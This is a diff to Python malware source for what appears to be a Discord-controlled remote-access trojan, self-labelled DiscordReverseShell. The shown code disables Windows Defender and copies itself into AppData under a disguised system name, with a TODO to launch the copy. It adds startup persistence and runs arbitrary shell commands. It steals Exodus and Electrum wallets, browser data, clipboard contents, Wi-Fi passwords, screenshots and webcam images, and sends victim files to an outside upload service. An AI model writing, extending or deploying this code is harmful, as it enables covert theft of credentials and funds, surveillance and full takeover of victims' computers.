@@ -29,10 +29,12 @@ if DEFENDER:
     disable_defender()
 
 
-
-
-
-
+def copyfile(file, target):
+    with open(file, "rb") as f:
+        bins = f.read()
+        
+    with open(target, "wb") as f:
+        f.write(bins)
 
 
 file_dir = sys.argv[0]
@@ -40,36 +42,24 @@ file_dir = sys.argv[0]
 def move():
     try:
         target_dir = f"{os.getenv('appdata')}\MicrosoftWindows\System"
-        #shutil.copyfile(f"{file_dir}\{os.path.basename(__file__)}", f"{target_dir}\SystemBin_64bit.exe")
-        print(file_dir)
-        print("error:")
-        with open(file_dir, "rb") as f:
-            bins = f.read()
-        
-        print(bins)
+        #shutil.copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")
+
+        copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")
+
+        try:
+            #subprocess.Popen(f"{target_dir}\SystemBin_64bit.exe", shell=True)
+            #TODO       Run somehow the copied version of malware and make sure that they are running independently!
             
-        print(file_dir)
-            
-        with open(f"{target_dir}\SystemBin_64bit.exe", "wb") as f:
-            f.write(bins)
-        
-        print(f"{target_dir}\SystemBin_64bit.exe")
-        
-        #subprocess.Popen(f"{target_dir}\SystemBin_64bit.exe", shell=True)
-        #sys.exit()
+            sys.exit()
+        except Exception as e:
+            print(e)
+            pass
     except Exception as e:
         print(e)
         return
     
-    
-if MOVE and file_dir != f"{os.getenv('appdata')}\MicrosoftWindows\System":
+if MOVE and file_dir[:1].upper() + file_dir[1:] != f"{os.getenv('appdata')}\MicrosoftWindows\System\SystemBin_64bit.exe":
     move()
-
-
-
-
-
-
 
 
 def error():
@@ -131,12 +121,14 @@ async def wallets(channel):
                 await channel.send(file=wallet_zip)
         except:
             embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await channel.send(embed=embed)
 
         delete_files(["Exodus.zip"])
     
     else:
         embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await channel.send(embed=embed)
 
     if os.path.exists(ELECTRUM_DIR):
@@ -152,9 +144,15 @@ async def wallets(channel):
                 await channel.send(file=wallet_zip)
         except:
             embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await channel.send(embed=embed)
 
         delete_files(["Electrum.zip"])
+        
+    else:
+        embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+        await channel.send(embed=embed)
         
 
 async def browsers(channel):
@@ -175,6 +173,7 @@ async def browsers(channel):
             await channel.send(file=browser_data)
         except:
             embed = discord.Embed(title="Error", description=f"Browser data was not found!", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await channel.send(embed=embed)
 
     delete_files(["Chrome.zip", "Opera.zip", "OperaGX.zip", "Brave.zip", "Edge.zip", "Chromium.zip"])
@@ -196,6 +195,7 @@ async def on_ready():
         system_info = "Failed to fetch system information!"
     
     embed.add_field(name="System Info", value=f"```{system_info}```", inline=False)
+    embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
     await channel.send(embed=embed)
     delete_files(["system.txt"])
     #browsers(channel)
@@ -210,6 +210,7 @@ async def on_message(message):
 
     if message.content == "help":
         embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
     elif message.content == "ping":
@@ -226,6 +227,7 @@ async def on_message(message):
             system_info = "Failed to fetch system information!"
 
         embed = discord.Embed(title="System Information", description=f"```{system_info}```", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.channel.send(embed=embed)
         delete_files(["system.txt"])
     
@@ -245,6 +247,7 @@ async def on_message(message):
             return
         
         embed = discord.Embed(title="Clipboard Content", description=f"```{clipboard}```", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
             
     elif message.content == "processes":
@@ -262,6 +265,7 @@ async def on_message(message):
             delete_files(["tasklist.txt"])
         else:
             embed = discord.Embed(title="Processes", description=f"```{tasks}```", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await message.reply(embed=embed)
     
     
@@ -272,6 +276,7 @@ async def on_message(message):
             embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
         except:
             embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
     elif message.content == "ls":
@@ -284,15 +289,18 @@ async def on_message(message):
                 f.write(files)
             file = discord.File("files.txt")
             embed = discord.Embed(title=f"Files > {os.getcwd()}", description="", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await message.reply(file=file, embed=embed)
             delete_files(["files.txt"])
             return
         
         embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
         
     elif message.content == "cwd":
         embed = discord.Embed(title="CWD", description=f"```{os.getcwd()}```", color=0xfafafa) #{os.path.basename(link)}
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
     elif message.content.startswith("download"):
@@ -300,10 +308,11 @@ async def on_message(message):
         try:
             link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
             embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
-            await message.reply(embed=embed)
+            #await message.reply(embed=embed)
         except:
             embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
-            await message.reply(embed=embed)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+        await message.reply(embed=embed)
 
     elif message.content.startswith("upload"):
         link = message.content[7:] #.split(" ")[1]
@@ -315,6 +324,7 @@ async def on_message(message):
             await message.reply("Failed to upload the file!")
             return
         embed = discord.Embed(title="Upload", description=f"```{os.getcwd()}{os.path.basename(link)}```", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
     elif message.content.startswith("cmd"):
@@ -328,6 +338,7 @@ async def on_message(message):
             return
         
         embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         
         if len(normal_output) > 1500:
             with open("output.txt", "w", encoding="utf-8") as f:
@@ -370,6 +381,7 @@ async def on_message(message):
             return
         
         embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa) # description=f"```{output}```",
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         
         if len(normal_output) > 1500:
             with open("output.txt", "w", encoding="utf-8") as f:
@@ -406,16 +418,16 @@ async def on_message(message):
             message.reply("Please specify a file to run!")
         try:
             output = subprocess.Popen(file, shell=True)
+            embed = discord.Embed(title="Started", description=f"```{file}\n{output}```", color=0xfafafa)
         except:
             embed = discord.Embed(title="Error", description=f"```Failed to start: {file}```", color=0xfafafa)
-            await message.reply(embed=embed)
-            return
-        embed = discord.Embed(title="Started", description=f"```{file}\n{output}```", color=0xfafafa)
+            #await message.reply(embed=embed)
+            #return
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
     
     elif message.content == "startup":
         Startup(sys.argv[0])
-        print(sys.argv[0])
         await message.reply("Startup Enabled!")
         
         
@@ -449,6 +461,7 @@ async def on_message(message):
             return
         
         embed = discord.Embed(title="Wifi Passwords", description=f"```{wifi}```", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
         delete_files(["wifi.txt"])
 
@@ -464,6 +477,7 @@ async def on_message(message):
         file = discord.File(path)
         embed = discord.Embed(title="Screenshot", color=0xfafafa)
         embed.set_image(url="attachment://screenshot.png")
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed, file=file)
 
     elif message.content == "webcam":
@@ -483,6 +497,7 @@ async def on_message(message):
         webcam = discord.File(path)
         embed = discord.Embed(title="Webcam", color=0xfafafa)
         embed.set_image(url="attachment://webcam.png")
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed, file=webcam)
     
     elif message.content == "browser":
@@ -513,6 +528,7 @@ async def on_message(message):
        
     else:
         embed = discord.Embed(title="Error", description="```Unknown command, use 'help' for full list of commands!```", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
     
 try:
@@ -524,3 +540,4 @@ except:
 #subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 #subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
